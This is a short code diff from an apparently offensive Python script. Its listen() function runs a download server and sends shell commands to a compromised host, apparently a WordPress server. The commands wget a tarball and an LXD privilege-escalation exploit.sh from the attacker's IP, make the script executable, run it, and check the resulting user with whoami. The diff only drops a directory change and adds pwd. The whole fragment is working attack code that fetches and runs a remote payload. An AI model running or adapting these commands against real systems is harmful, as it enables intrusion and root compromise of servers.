@@ -19,8 +19,8 @@ def listen(ip,port, t2, r_port, file_name):
 		print('[+] Download Server online on {ip}:{port}'.format(ip=ip, port=r_port))
 		print('[+] Waiting for connection')
 		time.sleep(0.5)
-		commands = ['cd /srv/www/wordpress\n', 'wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
-		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami\n'] #'rm -f {r_port}_file.tar.gz exploit.sh\n'.format(r_port=r_port)]
+		commands = ['wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
+		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n'] #'rm -f {r_port}_file.tar.gz exploit.sh\n'.format(r_port=r_port)]
 		for cmd in commands:
 			ans = recvall(conn)
 			sys.stdout.write(ans)
